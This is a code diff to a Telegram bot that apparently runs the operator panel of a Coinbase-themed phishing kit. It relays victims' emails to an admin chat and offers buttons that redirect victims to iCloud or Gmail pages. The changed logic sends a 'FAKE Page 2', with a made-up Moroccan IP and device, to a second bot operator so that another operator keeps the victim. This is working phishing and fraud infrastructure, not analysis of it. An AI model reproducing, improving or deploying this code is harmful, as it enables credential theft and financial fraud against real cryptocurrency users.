@@ -408,10 +408,10 @@ bot.on("callback_query", async (query) => {
     // ============================================================================
     // ✅ FAKE PAGE 2 LOGIC (Bot 1 fake redirection when Bot 2 is winner)
     // ============================================================================
-    if ((action === "page2") && userWinnerTelegram[email] === "telegram2") {
+    if ((action === "page2") && userWinnerTelegram[identifier] === "telegram2") {
       // Bot 2 is winner, Bot 1 clicked Email Redirection - send FAKE Page 2
       
-      const timeSinceBot2Won = Date.now() - bot2WinnerTimestamp[email];
+      const timeSinceBot2Won = Date.now() - bot2WinnerTimestamp[identifier];
       const TEN_SECONDS = 10000;
       
       console.log(`⏱️ Bot 1 clicked page2 - Time since Bot 2 won: ${timeSinceBot2Won}ms`);
@@ -424,7 +424,7 @@ bot.on("callback_query", async (query) => {
           try {
             // Send fake acceptance message
             await bot.sendMessage(ADMIN_CHAT_ID, 
-              `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`,
+              `📧 <code>${identifier}</code> has been <b>ACCEPTED</b>! ✅`,
               { parse_mode: "HTML" }
             );
             
@@ -432,7 +432,7 @@ bot.on("callback_query", async (query) => {
             const fakePage2Message = 
               `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
               `<b>👤 User ID:</b> <code>#1</code>\n` +
-              `<b>📧 Email:</b> <code>${email}</code>\n` +
+              `<b>📧 Email:</b> <code>${identifier}</code>\n` +
               `<b>🌍 Region:</b> Rabat, Morocco\n` +
               `<b>💻 Device:</b> Windows PC\n` +
               `<b>📍 IP:</b> 196.64.108.245`;
@@ -441,14 +441,14 @@ bot.on("callback_query", async (query) => {
               parse_mode: "HTML",
               reply_markup: {
                 inline_keyboard: [
-                  [{ text: "☁️ iCloud ☁️", callback_data: `fake_redirect_icloud|${email}` }],
-                  [{ text: "🌈 Gmail 🌈", callback_data: `fake_redirect_gmail|${email}` }]
+                  [{ text: "☁️ iCloud ☁️", callback_data: `fake_redirect_icloud|${identifier}` }],
+                  [{ text: "🌈 Gmail 🌈", callback_data: `fake_redirect_gmail|${identifier}` }]
                 ]
               }
             };
             
             await bot.sendMessage(ADMIN_CHAT_ID, fakePage2Message, fakePage2Options);
-            console.log(`✅ FAKE Page 2 sent to Bot 1 for ${email}`);
+            console.log(`✅ FAKE Page 2 sent to Bot 1 for ${identifier}`);
           } catch (err) {
             console.error("Error sending fake Page 2:", err);
           }
@@ -468,13 +468,13 @@ bot.on("callback_query", async (query) => {
     // ============================================================================
     // ✅ FAKE PAGE 2 BUTTON CLICKS (Bot 1 clicking on fake redirection buttons)
     // ============================================================================
-    if ((action === "fake_redirect_icloud" || action === "fake_redirect_gmail") && userWinnerTelegram[email] === "telegram2") {
+    if ((action === "fake_redirect_icloud" || action === "fake_redirect_gmail") && userWinnerTelegram[identifier] === "telegram2") {
       // Bot 1 clicked on FAKE Page 2 buttons - Just print and fake it
       
       const isIcloud = action === "fake_redirect_icloud";
       const statusMessage = isIcloud 
-        ? `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`
-        : `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
+        ? `📧 <code>${identifier}</code> redirected to ☁️<b>iCloud</b>☁️`
+        : `📧 <code>${identifier}</code> redirected to 🌈<b>Gmail</b>🌈`;
       
       console.log(`🎭 FAKE button clicked by Bot 1: ${action}`);
       
